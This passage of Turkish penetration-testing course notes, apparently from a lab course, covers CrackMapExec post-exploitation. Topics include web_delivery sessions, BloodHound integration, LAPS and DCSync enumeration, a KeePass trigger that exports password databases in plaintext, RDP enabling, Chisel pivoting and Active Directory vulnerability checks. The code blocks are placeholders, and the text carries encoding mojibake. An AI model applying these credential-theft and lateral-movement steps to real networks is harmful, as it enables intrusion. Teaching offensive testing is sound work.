Metasploit'te web delivery handler yapÄ±landÄ±rÄ±ldÄ±ktan sonra web_delivery modÃ¼lÃ¼nÃ¼ kullanabiliriz. `URL` ve `PAYLOAD` olmak Ã¼zere iki seÃ§eneÄŸi destekler. URL seÃ§eneÄŸini Metasploit tarafÄ±ndan saÄŸlanan URL ile ayarlamamÄ±z gerekir ve PAYLOAD seÃ§eneÄŸi seÃ§tiÄŸimiz payload mimarisine karÅŸÄ±lÄ±k gelir. EÄŸer `x64` kullanÄ±yorsak, `x64` varsayÄ±lan deÄŸer olduÄŸu iÃ§in bu seÃ§eneÄŸi atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. EÄŸer `32 bit` payload kullanÄ±yorsak `PAYLOAD=32` seÃ§eneÄŸini ayarlamamÄ±z gerekir. Åimdi bunu Ã§alÄ±ÅŸÄ±rken gÃ¶relim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum gÃ¶rmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

BaÅŸka bir C2 Framework kullanmak istediÄŸimizde, **Command Execution** bÃ¶lÃ¼mÃ¼nde bahsedilen (SMB, WinRM, SSH) yÃ¶ntemleri kullanarak aynÄ± sonucu elde edebiliriz. Ã–rneÄŸin, bir **PowerShell** payload'u oluÅŸturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip Ã§alÄ±ÅŸtÄ±rmak iÃ§in **-X** seÃ§eneÄŸiyle bir PowerShell komutu Ã§alÄ±ÅŸtÄ±rabiliriz. AyrÄ±ca, iÅŸlemi arka planda yÃ¼rÃ¼tmek iÃ§in **`--no-output`** seÃ§eneÄŸini seÃ§memiz gerekecektir.

Ã–rnek olarak Metasploit'i kullanalÄ±m ve modÃ¼lÃ¼ kullanmak yerine web_delivery payload'unda saÄŸlanan PowerShell script'ini kopyalamayÄ± deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bÃ¶lÃ¼m, CrackMapExec'i C2 Frameworks gibi diÄŸer bilgisayar korsanlÄ±ÄŸÄ± araÃ§larÄ±yla nasÄ±l kullanabileceÄŸimizi araÅŸtÄ±rÄ±yor. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in BloodHound ile nasÄ±l entegre edileceÄŸi incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldÄ±rganlar hem de savunmacÄ±lar tarafÄ±ndan alan gÃ¼venliÄŸini analiz etmek iÃ§in kullanÄ±lan aÃ§Ä±k kaynaklÄ± bir araÃ§tÄ±r. AraÃ§, domain'den toplanan bÃ¼yÃ¼k miktarda veriyi alÄ±r. Ä°liÅŸkiyi gÃ¶rsel olarak temsil etmek ve geleneksel numaralandÄ±rma ile tespit edilmesi zor veya imkansÄ±z olan domain saldÄ±rÄ± yollarÄ±nÄ± belirlemek iÃ§in grafik teorisini kullanÄ±r. Bu bÃ¶lÃ¼mde Bloodhound'a aÅŸina olduÄŸunuzu varsayÄ±yoruz. 


### **BloodHound**'da **Owned** olarak iÅŸaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geÃ§irilmiÅŸ (owned) olarak iÅŸaretleyebiliriz. Bunu yapmak iÃ§in node'a saÄŸ tÄ±klayÄ±p **`Mark X as Owned`** seÃ§eneÄŸine tÄ±klamamÄ±z yeterlidir. Bu, ele geÃ§irdiÄŸimiz kullanÄ±cÄ±larÄ± ve bilgisayarlarÄ± takip etmek aÃ§Ä±sÄ±ndan faydalÄ±dÄ±r, Ã¶zellikle bÃ¼yÃ¼k bir organizasyonla Ã§alÄ±ÅŸÄ±rken. AyrÄ±ca, **`Shortest Path from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan En KÄ±sa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan Domain Adminlerine En KÄ±sa Yollar) gibi bir BloodHound cypher sorgusu gerÃ§ekleÅŸtirmek istediÄŸimizde de kullanÄ±ÅŸlÄ±dÄ±r.

CrackMapExec'i, ele geÃ§irdiÄŸimiz herhangi bir user veya computer'Ä± BloodHound veritabanÄ±nda `owned` olarak iÅŸaretleyecek ÅŸekilde yapÄ±landÄ±rabiliriz. Bunu yapmak iÃ§in, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± aÅŸaÄŸÄ±daki seÃ§eneklerle deÄŸiÅŸtirmemiz gerekir:

* Bloodhound yapÄ±landÄ±rma seÃ§eneÄŸi `bh_enabled`'Ä± `True` olarak ayarlayÄ±n.
* `bh_uri`'yi Bloodhound veritabanÄ± `IP` adresimize ayarlayÄ±n.
* `bh_port`'u veritabanÄ± `portuna` ayarlayÄ±n
* Kimlik bilgilerini bloodhound veritabanÄ±yla eÅŸleÅŸecek ÅŸekilde ayarlayÄ±n: kullanÄ±cÄ± adÄ± `neo4j` ve ÅŸifre `asdasd123` (VeritabanÄ±nÄ±za karÅŸÄ±lÄ±k geleni kullandÄ±ÄŸÄ±nÄ±zdan emin olun).

YapÄ±landÄ±rma aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼nmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: BaÄŸlandÄ±ÄŸÄ±nÄ±z BloodHound veritabanÄ±na karÅŸÄ±lÄ±k gelen kullanÄ±cÄ± adÄ± ve parolayÄ± kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

### Bloodhound Verilerinin ToplanmasÄ±

BloodHound verilerini toplamak iÃ§in CrackMapExec kullanarak SharpHound'u Ã§alÄ±ÅŸtÄ±racak ve ardÄ±ndan dosyayÄ± saldÄ±rÄ± hostumuza aktaracaÄŸÄ±z.

### BloodHound verilerinin toplanmasÄ±

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Åimdi BloodHound'u aÃ§mamÄ±z ve verileri iÃ§e aktarmamÄ±z gerekiyor.


### BloodHound'da KullanÄ±cÄ±larÄ± Owned Olarak Ayarlama

Veriler iÃ§e aktarÄ±ldÄ±ktan sonra, `robert` kullanÄ±cÄ±sÄ± ile baÄŸlanmaya Ã§alÄ±ÅŸÄ±rsak, kullanÄ±cÄ±yÄ± BloodHound veritabanÄ±nda owned olunan olarak ayarlayacaktÄ±r.

### KullanÄ±cÄ± BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanÄ±cÄ±sÄ± olan bir makineyi tehlikeye atarsak da aynÄ± ÅŸey olacaktÄ±r. Bulunan tÃ¼m yeni kullanÄ±cÄ±larÄ± owned olarak ayarlayacaktÄ±r.

### Procdump ModÃ¼lÃ¼ ile KullanÄ±cÄ±larÄ± Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: TÃ¼m CrackMapExec seÃ§enekleri BloodHound veritabanÄ± ile senkronize olmayacaktÄ±r. Ã–rneÄŸin, `--ntds` veya `--lsa` seÃ§eneklerini denersek, kullanÄ±cÄ±larÄ± veritabanÄ±nda sahip olunan olarak iÅŸaretlemez, ancak `procdump` veya `lsassy` gibi modÃ¼ller kullanÄ±cÄ±larÄ± sahip olunan olarak iÅŸaretler.


### BloodHound'da BilgisayarlarÄ± Owned Olarak Ayarlama

YazÄ±m sÄ±rasÄ±nda, BloodHound entegrasyonu yalnÄ±zca user'larÄ± Owned olarak iÅŸaretlemektedir. Bir `computer` owned olarak iÅŸaretlemek istiyorsak, `bh_owned` modÃ¼lÃ¼nÃ¼ ve `neo4j` veritabanÄ±mÄ±zÄ±n kullanÄ±cÄ± adÄ± ve ÅŸifresini kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, diÄŸer varsayÄ±lan deÄŸerler neo4j veritabanÄ±mÄ±zla eÅŸleÅŸtiÄŸi iÃ§in yalnÄ±zca `PASS` seÃ§eneÄŸini ekleyeceÄŸiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, bÃ¼yÃ¼k aÄŸlarla uÄŸraÅŸÄ±rken birÃ§ok seÃ§enek sunar ve mÃ¼ÅŸterilerimizle paylaÅŸmak istememiz durumunda veritabanÄ±nÄ± gÃ¼ncellemenin hÄ±zlÄ± bir yoludur. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec'te mevcut olan bazÄ± popÃ¼ler modÃ¼llerle Ã§alÄ±ÅŸacaÄŸÄ±z.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici ÅŸeylerden biri, modÃ¼ler olmasÄ± ve herkesin modÃ¼ller oluÅŸturmasÄ±na ve bunlarÄ± araca katkÄ±da bulunmasÄ±na izin vermesidir. CrackMapExec, exploit ve exploit sonrasÄ± gÃ¶revleri kolaylaÅŸtÄ±rmak iÃ§in iÅŸlemler gerÃ§ekleÅŸtirmemizi saÄŸlayan 50'den fazla modÃ¼le sahiptir. Bu bÃ¶lÃ¼mde LDAP ve SMB protokolleri iÃ§in bu modÃ¼llerden bazÄ±larÄ± incelenecektir.


### LDAP Protocol Modules

LDAP protokolÃ¼ yaygÄ±n olarak Domain Controller'lar ile etkileÅŸime geÃ§memizi ve onlardan bilgi almamÄ±zÄ± saÄŸlar. Active Directory'den ilginÃ§ bilgiler Ã§Ä±karmamÄ±zÄ± saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.


### **LDAP Module - get-network**

`get-network` modÃ¼lÃ¼ [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'Ä±  temel alÄ±r. VarsayÄ±lan olarak, Active Directory'deki herhangi bir kullanÄ±cÄ±, `zone transferine` benzer ÅŸekilde Domain veya Forest DNS bÃ¶lgelerindeki tÃ¼m DNS kayÄ±tlarÄ±nÄ± numaralandÄ±rabilir. Bu araÃ§, internal aÄŸlarÄ±n yeniden yapÄ±landÄ±rÄ±lmasÄ± amacÄ±yla bÃ¶lgedeki tÃ¼m DNS kayÄ±tlarÄ±nÄ±n numaralandÄ±rÄ±lmasÄ±nÄ± ve dÄ±ÅŸa aktarÄ±lmasÄ±nÄ± saÄŸlar.

ModÃ¼lÃ¼ kullanmanÄ±n Ã¼Ã§ (3) yolu vardÄ±r:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adlarÄ±).

VarsayÄ±lan olarak, herhangi bir seÃ§enek belirtmezsek, modÃ¼l yalnÄ±zca IP adresini alacaktÄ±r. `ALL=true` seÃ§eneÄŸini seÃ§ersek, hem IP hem de domain adlarÄ±nÄ± alÄ±r ve `ONLY_HOSTS=true` olarak belirtirsek, yalnÄ±zca FQDN'yi alÄ±rÄ±z.


### DNS Sunucusundan (Record) KayÄ±tlarÄ± Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± zamanda, modÃ¼l **`adidnsdump`** aracÄ±yla bazÄ± farklÄ±lÄ±klar gÃ¶stermektedir. SonuÃ§lar, hesaplar arasÄ±nda farklÄ±lÄ±k gÃ¶sterebilir.


### LDAP Module - laps

Bir baÅŸka harika modÃ¼l de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e baÄŸlÄ± bilgisayarlarda local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL'ler tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca belirli kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya `parola sÄ±fÄ±rlama` talebinde bulunabilir. Laps modÃ¼lÃ¼ ile bir hesabÄ±n okuma eriÅŸimine sahip olduÄŸu tÃ¼m bilgisayarlarÄ± alabiliriz. Bir bilgisayarÄ± belirtmek iÃ§in `COMPUTER` seÃ§eneÄŸini de kullanabilir veya benzer ada sahip birkaÃ§ bilgisayarÄ± almak iÃ§in bir wildcard karakterle birlikte kullanabiliriz.


### LAPS ModÃ¼lÃ¼ ParolalarÄ±n AlÄ±nmasÄ±

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: KullanÄ±lan parola bir Ã¶rnektir. Hedef hostta Ã§alÄ±ÅŸmayacaktÄ±r

### LDAP ModÃ¼lÃ¼ - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'Ã¼ ile temsil edilen ve varsayÄ±lan olarak bir **user**'Ä±n bir **domain** iÃ§inde oluÅŸturabileceÄŸi **computer account** sayÄ±sÄ±nÄ± belirten bir **domain level attribute**'tÃ¼r.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazÄ± **attack** senaryolarÄ±nda **domain** iÃ§inde bir **machine** oluÅŸturmak gerekebilir, bu yÃ¼zden **account machine quota attribute**'Ã¼nÃ¼ **enumerate** etmek Ã¶nemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir baÅŸka harika modÃ¼l ise bir veya birden fazla object'in `DACL`'lerini okumamÄ±zÄ± ve dÄ±ÅŸa aktarmamÄ±zÄ± saÄŸlayan `daclread`'dir. Bu modÃ¼l Active Directory eriÅŸimini numaralandÄ±rmamÄ±zÄ± saÄŸlayacaktÄ±r. AÅŸaÄŸÄ±daki seÃ§eneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabÄ±nÄ±n tÃ¼m **ACE**'lerini okumak istiyoruz. Bunun iÃ§in **`TARGET`** seÃ§eneÄŸini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace KullanÄ±cÄ±sÄ±nÄ±n DACL'sini Oku

{{CODE_BLOCK_203}}


AyrÄ±ca belirli haklarÄ± da arayabiliriz, Ã¶rneÄŸin hangi **principal**'larÄ±n **DCSync** haklarÄ±na sahip olduÄŸunu. Bunun iÃ§in **`TARGET_DN`** seÃ§eneÄŸini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seÃ§eneÄŸini seÃ§memiz ve aramak istediÄŸimiz haklarÄ± **`RIGHTS`** seÃ§eneÄŸiyle belirlememiz gerekir.

### DCSync Rights'a Sahip KullanÄ±cÄ±larÄ± Arama

{{CODE_BLOCK_204}}



Ã‡Ä±ktÄ±da gÃ¶sterildiÄŸi gibi, `ACE[4]` `robert` kullanÄ±cÄ±sÄ±nÄ±n hedef domain'de `DCSync` haklarÄ±na sahip olduÄŸunu gÃ¶sterir.

LDAP'ta birkaÃ§ modÃ¼l daha kullanabiliriz. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolÃ¼nde daha fazla modÃ¼l mevcuttur. CrackMapExec modÃ¼lÃ¼nde yaptÄ±ÄŸÄ±mÄ±z ÅŸeylerin Ã§oÄŸu SMB protokolÃ¼nÃ¼ kullanÄ±r. Ä°lginÃ§ bilgiler elde etmemizi saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.

Not: SMB kullanan modÃ¼llerin Ã§oÄŸunun Ã§alÄ±ÅŸmasÄ± iÃ§in admin haklarÄ±na ( `Pwned!` ) ihtiyaÃ§ vardÄ±r.


### SMB ModÃ¼lleri - get_netconnections ve ioxidresolver

Bir aÄŸ pentesti Ã¼zerinde Ã§alÄ±ÅŸÄ±rken, sÃ¼rekli olarak daha fazla kaynaÄŸa veya aÄŸa eriÅŸim elde etmeye Ã§alÄ±ÅŸÄ±rÄ±z. CrackMapExec, daha Ã¶nce tehlikeye attÄ±ÄŸÄ±mÄ±z bir makineyi numaralandÄ±rmamÄ±za ve birden fazla aÄŸ yapÄ±landÄ±rmasÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± belirlememize olanak tanÄ±yan bazÄ± modÃ¼llere sahiptir. `get_netconnections` ve `ioxidresolver` modÃ¼llerini kullanalÄ±m ve farklarÄ±nÄ± gÃ¶relim.

`get_netconnections` modÃ¼lÃ¼, aÄŸ baÄŸlantÄ±larÄ±nÄ± sorgulamak iÃ§in `WMI` kullanÄ±r. `IPv6` ve herhangi bir ikincil IP dahil olmak Ã¼zere tÃ¼m IP adreslerinin yanÄ± sÄ±ra domain adÄ±nÄ± da alÄ±r.


### get_netconnections Module

{{CODE_BLOCK_206}}


Ã–te yandan, `ioxidresolver` modÃ¼lÃ¼ IP adreslerini sorgulamak iÃ§in RPC kullanÄ±r. Ancak, bu modÃ¼l `IPv6` adreslerini iÃ§ermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: Ä°htiyaÃ§larÄ±mÄ±za en uygun olanÄ± seÃ§ebilmemiz iÃ§in bir modÃ¼lÃ¼n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal aÄŸlarda adminler ve kullanÄ±cÄ±lar tarafÄ±ndan parolalarÄ± ve gizli bilgileri tek bir veritabanÄ±nda saklamak iÃ§in yaygÄ±n olarak kullanÄ±lan Ã¼cretsiz, aÃ§Ä±k kaynaklÄ± bir password manager'dÄ±r. Bir master password onu korur. Bir KeePass veritabanÄ± alÄ±rsak, onu aÃ§mak iÃ§in ÅŸifresine ihtiyacÄ±mÄ±z vardÄ±r.

### KeePass'i KeÅŸfetme

{{CODE_BLOCK_208}}

EÄŸer master parolaya sahip deÄŸilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafÄ±ndan geliÅŸtirilen ve veritabanÄ±nÄ± aÃ§Ä±k metin olarak dÄ±ÅŸa aktarmak iÃ§in KeePass'Ä±n triger sistemini kullanan bir teknik kullanmaktÄ±r. KeePass yapÄ±landÄ±rma dosyasÄ±nÄ±, veritabanÄ±nÄ± otomatik olarak aÃ§Ä±k metin olarak dÄ±ÅŸa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) iÃ§erecek ÅŸekilde deÄŸiÅŸtirir.

Bunu kullanmak iÃ§in beÅŸ (5) adÄ±ma ihtiyacÄ±mÄ±z var:

*  KeePass yapÄ±landÄ±rma dosyasÄ±nÄ± bulun. Biz bunu `keepass_discover` modÃ¼lÃ¼ ile yaptÄ±k.
 * `ACTION=ADD` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH` Ã¶ÄŸesini kullanarak trigger'Ä± yapÄ±landÄ±rma dosyasÄ±na ekleyin.

### KeePass YapÄ±landÄ±rma DosyasÄ±na Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapÄ±landÄ±rma yolu iÃ§in ters eÄŸik Ã§izgi (`/`) veya Ã§ift eÄŸik Ã§izgi (`\`) kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

* KullanÄ±cÄ±nÄ±n KeePass'i aÃ§masÄ±nÄ± ve master parolayÄ± girmesini bekleyin. Bu iÅŸlemi zorlamak iÃ§in `ACTION=RESTART` seÃ§eneÄŸini kullanarak KeePass.exe prosesini yeniden baÅŸlatabiliriz. Hedef makinede oturum aÃ§mÄ±ÅŸ Ã§ok sayÄ±da kullanÄ±cÄ± varsa, `USER=julio` gibi kullanÄ±cÄ± adÄ± ile `USER` seÃ§eneÄŸini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seÃ§eneÄŸini kullanarak export edilen veritabanÄ±nÄ± makinemize sorgulayÄ±n. Daha sonra ÅŸifre giriÅŸlerini aramak iÃ§in grep kullanabiliriz.


### Ele GeÃ§irilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapÄ±landÄ±rma dosyasÄ±nÄ± temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modÃ¼lÃ¼n her seÃ§eneÄŸini Ã¶ÄŸrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seÃ§eneÄŸin iyi yanÄ±, **extract_password** yÃ¶ntemini de iÃ§ermesidir; bu yÃ¶ntem **.xml** dosyasÄ±nda herhangi bir parola giriÅŸini arar ve konsola yazdÄ±rÄ±r.


### keeppass_trigger TÃœMÃœNÃœ Tek Komutta Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_214}}

Not: ModÃ¼l ÅŸifreyi yazdÄ±rÄ±rken sorun yaÅŸayabilir. Bir hata alabiliriz, ancak ÅŸifre `/tmp/export.xml` dosyasÄ±nda olacaktÄ±r, bÃ¶ylece manuel olarak alabiliriz.

### RDP'yi EtkinleÅŸtirme veya Devre DÄ±ÅŸÄ± BÄ±rakma

DeÄŸerlendirme yaparken yapmak isteyebileceÄŸimiz yaygÄ±n bir gÃ¶rev, RDP aracÄ±lÄ±ÄŸÄ±yla bir hedef makineye baÄŸlanmaktÄ±r. Bu, baÅŸka tÃ¼rlÃ¼ lateral hareket saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtiremediÄŸimiz veya standart bir protokol kullanarak radarÄ±n altÄ±ndan geÃ§mek istediÄŸimiz bazÄ± senaryolarda yararlÄ± olabilir.

BaÄŸlanmak istediÄŸimiz makinede RDP etkin deÄŸilse, buna izin vermek iÃ§in RDP modÃ¼lÃ¼nÃ¼ kullanabiliriz. `ACTION` seÃ§eneÄŸini ve ardÄ±ndan `enable` veya `disable` seÃ§eneklerini belirtmemiz gerekir.


### RDP'yi EtkinleÅŸtirme

{{CODE_BLOCK_215}}


SMB'de birkaÃ§ modÃ¼l daha vardÄ±r. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bÃ¶lÃ¼mde, ZeroLogon gibi bilinen gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanan diÄŸer SMB modÃ¼llerine bakacaÄŸÄ±z

### Vulnerability Scan Modules

SÄ±zma testi yaparken gerÃ§ekleÅŸtirdiÄŸimiz gÃ¼nlÃ¼k faaliyetlerden biri gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmeye Ã§alÄ±ÅŸmaktÄ±r. EÄŸer herhangi birini bulabilirsek, exploitation iÅŸi basit olabilir.

CrackMapExec, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmemizi saÄŸlayan bazÄ± modÃ¼ller iÃ§erir. Bu oturumda bunlardan bazÄ±larÄ±nÄ± inceleyeceÄŸiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geÃ§irdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki aÄŸ kartÄ± var ve amacÄ±mÄ±z domainin saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek. Domainin IP adresi `172.16.10.3`'tÃ¼r.

Domain'e eriÅŸim saÄŸlamak iÃ§in, CME ile ProxyChain bÃ¶lÃ¼mÃ¼nde Ã¶ÄŸrendiklerimizi kullanacaÄŸÄ±z ve Chisel ile bir baÄŸlantÄ± kuracaÄŸÄ±z


### Chisel'i Hedef Makineye GÃ¶nderme

{{CODE_BLOCK_217}}


### SaldÄ±rÄ± Hostumuzda Chisel'Ä± Sunucu Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_218}}


### Chisel'Ä± Tehlikeye DÃ¼ÅŸmÃ¼ÅŸ Cihazdan SaldÄ±rÄ± Hostumuza BaÄŸlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki gÃ¼venlik aÃ§Ä±ÄŸÄ± modÃ¼llerinin Ã§oÄŸu yalnÄ±zca kontrol edilir ve bu modÃ¼lleri gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanmak iÃ§in kullanamayÄ±z. [ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile baÅŸlayalÄ±m.


### ZeroLogon

KimliÄŸi doÄŸrulanmamÄ±ÅŸ bir saldÄ±rgan, bir domain controller'a aÄŸ eriÅŸimi ile[ ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanmak ve sonunda domain'in controller'Ä± ele geÃ§irmek iÃ§in savunmasÄ±z bir Netlogon session'Ä± baÅŸlatmasÄ± gerekir. Bir Domain Controller'a baÄŸlanmak baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in tek Ã¶n koÅŸul olduÄŸundan, gÃ¼venlik aÃ§Ä±ÄŸÄ± ciddidir.

CrackMapExec, bir Domain Controller'Ä±n ZeroLogon'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan zerologon adlÄ± bir modÃ¼l iÃ§erir.


### ZeroLogon GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_220}}


### PetitPotam

GÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± [Gilles Lionel](https://twitter.com/topotam77) kÄ±sa bir sÃ¼re Ã¶nce [PetitPotam](https://github.com/topotam/PetitPotam) adÄ± verilen ve saldÄ±rganlarÄ±n sadece kurumsal aÄŸ altyapÄ±sÄ±na eriÅŸim saÄŸlayarak domain'i tehlikeye atmasÄ±na olanak tanÄ±yan bir saldÄ±rÄ± tekniÄŸini ortaya Ã§Ä±kardÄ±. YÃ¶ntem, sunulan herhangi bir sunucu servisine (Ã¶rneÄŸin bir Domain Controller) yÃ¶nelik klasik bir `NTLM relay` saldÄ±rÄ±sÄ±dÄ±r. Lionel ayrÄ±ca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldÄ±rganlarÄ±n domain'i ele geÃ§irmek iÃ§in bu Ã¶zel saldÄ±rÄ± tekniÄŸini nasÄ±l kullanabileceklerini gÃ¶steren bir proof of  concept kodu da yayÄ±nladÄ±.

CrackMapExec, bir Domain Controller'Ä±n PetitPotam'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan `petitpotam` adlÄ± bir modÃ¼l iÃ§erir.


### Petitpotam GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_221}}


### noPAC

noPAC gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n exploit'i, normal bir domain kullanÄ±cÄ±sÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ±n bir domain admin yÃ¼kseltilmesine izin verdi. Kavram kanÄ±tÄ± (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayÄ±nlandÄ±.

CrackMapExec, bir domain controller'Ä±n noPAC'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan nopac adlÄ± bir modÃ¼l iÃ§erir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlÄ± bir NTLM relay saldÄ±rÄ±sÄ± iÃ§in bir kavram kanÄ±tÄ± ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayÄ±nladÄ±. YÃ¶ntem, bir Windows domain'inin controller'Ä± ele geÃ§irmek iÃ§in Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolÃ¼nÃ¼ ele geÃ§iriyor.

Bu saldÄ±rÄ± bir domain kullanÄ±cÄ±sÄ± gerektirir ve bir DC'nin savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in CrackMapExec modÃ¼lÃ¼ `dfscoerce`'yi kullanabiliriz. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kontrol etmek iÃ§in `Y3t4n0th3rP4ssw0rd` ÅŸifresiyle `carole.holmes` hesabÄ±nÄ± kullanacaÄŸÄ±z.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, gÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± Lionel Gilles tarafÄ±ndan 2021'in sonlarÄ±nda PetitPotam saldÄ±rÄ±sÄ±nÄ± sergileyen bir sunumun sonunda keÅŸfedildi ve ilk kez detaylandÄ±rÄ±ldÄ±. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanÄ±tÄ± ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluÅŸturdu.

CrackMapExec modÃ¼lÃ¼ shadowcoerce kullanarak DC'nin bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in carole.holmes hesabÄ±nÄ± kullanalÄ±m.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


